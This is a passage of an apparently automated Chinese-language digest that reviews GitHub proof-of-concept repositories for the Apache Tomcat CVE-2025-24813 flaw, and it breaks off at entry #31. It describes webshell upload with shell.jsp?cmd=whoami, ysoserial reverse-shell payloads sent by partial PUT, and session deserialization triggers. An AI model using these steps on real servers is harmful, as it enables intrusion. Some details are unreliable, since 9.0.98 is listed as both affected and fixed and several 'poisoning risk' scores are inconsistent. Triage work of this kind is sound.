**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

